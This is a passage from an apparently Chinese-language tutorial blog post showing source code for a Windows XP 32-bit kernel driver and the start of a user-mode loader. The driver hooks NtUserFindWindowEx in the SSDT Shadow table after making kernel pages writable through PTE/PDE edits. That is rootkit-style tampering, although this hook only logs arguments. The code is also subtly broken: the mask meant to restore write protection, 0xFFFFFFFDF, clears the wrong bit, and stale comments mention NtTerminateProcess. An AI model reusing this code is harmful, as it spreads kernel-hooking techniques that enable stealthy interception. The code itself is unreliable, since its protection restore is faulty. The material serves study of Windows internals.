class="class">&#123;</span></span><br><span class="line">	PULONG ServiceTableBase;		<span class="comment">// 函数地址表</span></span><br><span class="line">	PULONG ServiceCounterTableBase;		<span class="comment">//函数被调用的次数</span></span><br><span class="line">	ULONG NumberOfService;			<span class="comment">// 函数个数</span></span><br><span class="line">	PULONG ParamTableBase;			<span class="comment">// 函数参数表（SSPT）</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE ntoskrnl;		<span class="comment">// 内核ntkrnlpa.exe函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE win32k;		<span class="comment">// win32k.sys函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed1;</span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed2;</span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ntoskrnl.exe 导出的全局变量</span></span><br><span class="line"><span class="keyword">extern</span> PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable; </span><br><span class="line"><span class="comment">// Only XP 32bit can be used.</span></span><br><span class="line">PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTableShadow;</span><br><span class="line"><span class="comment">// 旧的函数地址</span></span><br><span class="line">ULONG uOldNtUserFindWindowEx; </span><br><span class="line"><span class="comment">//系统服务号，从3环传进来</span></span><br><span class="line">ULONG g_dwFun_R0_API = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">HookNtUserFindWindowEx</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">UnHookNtUserFindWindowEx</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// NTUSERFINDWINDOWSEX，用来指向旧的NtUserFindWindowEx函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*NTUSERFINDWINDOWSEX)</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndParent, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndChild, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrClassName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrWindowName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG dwTyp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtUserFindWindowEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndParent, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndChild, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrClassName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrWindowName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG dwTyp)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">PrintCurrentProcessInfo</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为可写，WP = 0</span></span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*	__asm</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		cli; // 关闭中断</span></span><br><span class="line"><span class="comment">		mov eax, cr0;</span></span><br><span class="line"><span class="comment">		and eax, not 0x10000; // and eax,0FFFEFFFFh，WP位置0</span></span><br><span class="line"><span class="comment">		mov cr0, eax;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	ULONG RCR4 = <span class="number">0</span>;</span><br><span class="line">	ULONG HookFunAddr = KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE];</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli;</span><br><span class="line">		<span class="comment">//mov eax,cr4，VS2010无法识别该行代码，故以硬编码形式写入</span></span><br><span class="line">		_emit <span class="number">0x0F</span></span><br><span class="line">		_emit <span class="number">0x20</span></span><br><span class="line">		_emit <span class="number">0xE0</span></span><br><span class="line">		mov RCR4,eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(RCR4 &amp; <span class="number">0x00000020</span>)	<span class="comment">//说明是2-9-9-12分页</span></span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x007FFFF8</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xc0600000</span> + ((HookFunAddr &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3ff8</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>	<span class="comment">//说明是10-10-12分页</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x003FFFFC</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0300000</span> + ((HookFunAddr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置为不可写，WP = 1</span></span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*	__asm</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		mov eax, cr0;</span></span><br><span class="line"><span class="comment">		or eax, 0x10000; // WP位置1，</span></span><br><span class="line"><span class="comment">		mov cr0, eax;</span></span><br><span class="line"><span class="comment">		sti; // 恢复中断</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	ULONG RCR4 = <span class="number">0</span>;</span><br><span class="line">	ULONG HookFunAddr = KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE];</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//mov eax,cr4，VS2010无法识别该行代码，故以硬编码形式写入</span></span><br><span class="line">		_emit <span class="number">0x0F</span></span><br><span class="line">		_emit <span class="number">0x20</span></span><br><span class="line">		_emit <span class="number">0xE0</span></span><br><span class="line">		mov RCR4,eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(RCR4 &amp; <span class="number">0x00000020</span>)	<span class="comment">//说明是2-9-9-12分页</span></span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x007FFFF8</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xc0600000</span> + ((HookFunAddr &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3ff8</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>	<span class="comment">//说明是10-10-12分页</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x003FFFFC</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0300000</span> + ((HookFunAddr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	__asm sti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG Status;</span><br><span class="line">	ULONG uIndex = <span class="number">0</span>;</span><br><span class="line">	PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>; <span class="comment">// 设备对象指针</span></span><br><span class="line">	UNICODE_STRING DeviceName; <span class="comment">// 设备名，0环用</span></span><br><span class="line">	UNICODE_STRING SymbolicLinkName; <span class="comment">// 符号链接名，3环用</span></span><br><span class="line">	KeServiceDescriptorTableShadow = (PKSERVICE_TABLE_DESCRIPTOR)((ULONG)KeServiceDescriptorTable - <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	PrintCurrentProcessInfo();</span><br><span class="line">	<span class="comment">// 创建设备名称</span></span><br><span class="line">	RtlInitUnicodeString(&amp;DeviceName,DEVICE_NAME);</span><br><span class="line">	<span class="comment">// 创建设备</span></span><br><span class="line">	Status = IoCreateDevice(pDriver,<span class="number">0</span>,&amp;DeviceName,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&amp;pDeviceObj);</span><br><span class="line">	<span class="keyword">if</span> (Status != STATUS_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		IoDeleteDevice(pDeviceObj);</span><br><span class="line">		DbgPrint(<span class="string">&quot;创建设备失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> Status;</span><br><span class="line">	&#125;</span><br><span class="line">	DbgPrint(<span class="string">&quot;创建设备成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 设置交互数据的方式</span></span><br><span class="line">	pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">	<span class="comment">// 创建符号链接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);</span><br><span class="line">	<span class="comment">// 设置分发函数</span></span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc;</span><br><span class="line">	<span class="comment">// 设置卸载函数</span></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING SymbolicLinkName;</span><br><span class="line">	<span class="comment">// 删除符号链接，删除设备</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">	IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动卸载成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不设置这个函数，则Ring3调用CreateFile会返回1</span></span><br><span class="line"><span class="comment">// IRP_MJ_CREATE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_CLOSE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层断开连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_DEVICE_CONTROL 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// DbgPrint(&quot;IrpDeviceControlProc.\n&quot;);</span></span><br><span class="line">	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">	ULONG uIoControlCode;</span><br><span class="line">	PVOID pIoBuffer;</span><br><span class="line">	ULONG uInLength;</span><br><span class="line">	ULONG uOutLength;</span><br><span class="line">	ULONG uRead;</span><br><span class="line">	ULONG uWrite;</span><br><span class="line">	BOOLEAN bRet = FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置临时变量的值</span></span><br><span class="line">	uRead = <span class="number">0</span>;</span><br><span class="line">	uWrite = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 获取IRP数据</span></span><br><span class="line">	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">	<span class="comment">// 获取控制码</span></span><br><span class="line">	uIoControlCode = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">	<span class="comment">// 获取缓冲区地址（输入输出是同一个）</span></span><br><span class="line">	pIoBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">// Ring3 发送数据的长度</span></span><br><span class="line">	uInLength = pIrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">	<span class="comment">// Ring0 发送数据的长度</span></span><br><span class="line">	uOutLength = pIrpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (uIoControlCode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> OPHOOK:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 打印进程镜像名和PID</span></span><br><span class="line">			PrintCurrentProcessInfo();</span><br><span class="line">			<span class="comment">// 读取缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead,pIoBuffer,<span class="number">4</span>);</span><br><span class="line">			<span class="comment">//DbgPrint(&quot;Get Service Num is %x\n&quot;,uRead);</span></span><br><span class="line">			<span class="comment">//执行结束进程</span></span><br><span class="line">			bRet = HookNtUserFindWindowEx();</span><br><span class="line">			<span class="keyword">if</span>(bRet == TRUE)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 写入缓冲区</span></span><br><span class="line">				uWrite = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite, <span class="number">4</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 写入缓冲区</span></span><br><span class="line">				uWrite = <span class="number">0</span>;</span><br><span class="line">				<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite, <span class="number">4</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">4</span>;</span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">case</span> OPUNHOOK:</span><br><span class="line">		&#123;</span><br><span class="line">			bRet = UnHookNtUserFindWindowEx();</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = status;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HOOK NtTerminateProcess</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">HookNtUserFindWindowEx</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	uOldNtUserFindWindowEx = KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE];</span><br><span class="line">	KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE] = (ULONG)MyNtUserFindWindowEx;</span><br><span class="line">	DisableWrite();</span><br><span class="line">	DbgPrint(<span class="string">&quot;Hooked: %p -&gt; %p\n&quot;</span>, uOldNtUserFindWindowEx, KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE]);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UnHOOK NtTerminateProcess</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">UnHookNtUserFindWindowEx</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE] = uOldNtUserFindWindowEx;</span><br><span class="line">	DisableWrite();</span><br><span class="line">	DbgPrint(<span class="string">&quot;UnHooked: %p\n&quot;</span>, KeServiceDescriptorTableShadow-&gt;win32k.ServiceTableBase[NTUSERFINDWINDOWEX_SERVICE]);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被修改的 NtUserFindWindowEx 函数，简单打印参数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtUserFindWindowEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndParent, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG hwndChild, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrClassName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG pstrWindowName, </span></span></span><br><span class="line"><span class="function"><span class="params">			IN ULONG dwTyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;NtUserFindWindowEx(%x, %x, %x, %x, %x)\n&quot;</span>, hwndParent,hwndChild,pstrClassName,pstrWindowName,dwTyp);</span><br><span class="line">	<span class="keyword">return</span> ((NTUSERFINDWINDOWSEX)uOldNtUserFindWindowEx)(hwndParent,hwndChild,pstrClassName,pstrWindowName,dwTyp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印进程镜像名和PID</span></span><br><span class="line"><span class="function">VOID <span class="title">PrintCurrentProcessInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PEPROCESS pEprocess = <span class="literal">NULL</span>;</span><br><span class="line">	PCHAR ImageFileName;</span><br><span class="line">	ULONG pid;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax, fs:[<span class="number">0x124</span>];</span><br><span class="line">		mov eax, [eax + <span class="number">0x220</span>];</span><br><span class="line">		mov pEprocess, eax;</span><br><span class="line">		mov eax, [eax + <span class="number">0x84</span>];</span><br><span class="line">		mov pid, eax;</span><br><span class="line">	&#125;</span><br><span class="line">	ImageFileName = (PCHAR)pEprocess + <span class="number">0x174</span>;</span><br><span class="line">	DbgPrint(<span class="string">&quot;pid: %x, ImageFileName:%s\n&quot;</span>,pid, ImageFileName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>3环代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HOOK0316.cpp : Defines the entry point for the console application.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个简单的驱动，在驱动入口和卸载函数打印一些提示信息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_NAME <span class="meta-string">L&quot;HOOKFindWindowA&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_PATH <span class="meta-string">L&quot;HOOKFindWindowA.sys&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\\\.\\HOOKFindWindowALnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPHOOK CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPUNHOOK CTL_CODE(FILE_DEVICE_UNKNOWN,0x901,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDriver</span><span class="params">(PCWSTR lpszDriverName, PCWSTR lpszDriverPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 获取驱动完整路径</span></span><br><span class="line">	WCHAR szDriverFullPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	GetFullPathNameW(lpszDriverPath,MAX_PATH,szDriverFullPath,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;%ws\n&quot;, szDriverFullPath);</span></span><br><span class="line">	<span class="comment">// 打开服务控制管理器</span></span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>; <span class="comment">// SCM管理器句柄	</span></span><br><span class="line">	hServiceMgr = OpenSCManagerW(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenSCManagerW 失败, %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;打开服务控制管理器成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 创建驱动服务</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>; <span class="comment">// NT驱动程序服务句柄</span></span><br><span class="line">	hServiceDDK = CreateServiceW(</span><br><span class="line">		hServiceMgr,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		SERVICE_ALL_ACCESS,</span><br><span class="line">		SERVICE_KERNEL_DRIVER,</span><br><span class="line">		SERVICE_DEMAND_START,</span><br><span class="line">		SERVICE_ERROR_IGNORE,</span><br><span class="line">		szDriverFullPath,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_IO_PENDING &amp;&amp; dwErr != ERROR_SERVICE_EXISTS)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务成功.\n&quot;</span>);</span><br><span class="line">	DWORD dwErr = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 驱动服务已经创建，打开服务</span></span><br><span class="line">	hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	dwErr = GetLastError();</span><br><span class="line">	<span class="comment">//printf(&quot;%d\n&quot;, dwErr);</span></span><br><span class="line">	<span class="keyword">if</span> (!StartService(hServiceDDK, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_SERVICE_ALREADY_RUNNING)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunHOOKDriver</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span 